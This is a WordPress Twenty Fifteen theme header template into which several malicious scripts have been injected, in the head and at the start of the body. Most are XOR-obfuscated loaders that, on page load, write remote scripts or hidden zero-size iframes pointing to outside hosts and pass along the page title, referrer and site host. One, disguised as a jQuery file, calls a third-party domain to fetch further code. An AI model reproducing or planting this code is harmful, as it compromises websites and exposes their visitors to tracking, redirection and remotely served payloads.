<?php
/**
 * The template for displaying the header
 *
 * Displays all of the head element and everything up until the "site-content" div.
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?> class="no-js">
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
	<!--[if lt IE 9]>
	<script src="<?php echo esc_url( get_template_directory_uri() ); ?>/js/html5.js"></script>
	<![endif]-->
	<?php wp_head(); ?>
    <!-- ###: -->
    <script>var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
    <!-- :### -->
    <!-- ###: -->
    <script>var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
    <!-- :### -->
<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://phanmemvuonxa.com/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>

<body <?php body_class(); ?>>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'twentyfifteen' ); ?></a>

	<div id="sidebar" class="sidebar">
		<header id="masthead" class="site-header" role="banner">
			<div class="site-branding">
				<?php
					if ( is_front_page() && is_home() ) : ?>
						<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<?php else : ?>
						<p class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></p>
					<?php endif;

					$description = get_bloginfo( 'description', 'display' );
					if ( $description || is_customize_preview() ) : ?>
						<p class="site-description"><?php echo $description; ?></p>
					<?php endif;
				?>
				<button class="secondary-toggle"><?php _e( 'Menu and widgets', 'twentyfifteen' ); ?></button>
			</div><!-- .site-branding -->
		</header><!-- .site-header -->

		<?php get_sidebar(); ?>
	</div><!-- .sidebar -->

	<div id="content" class="site-content">
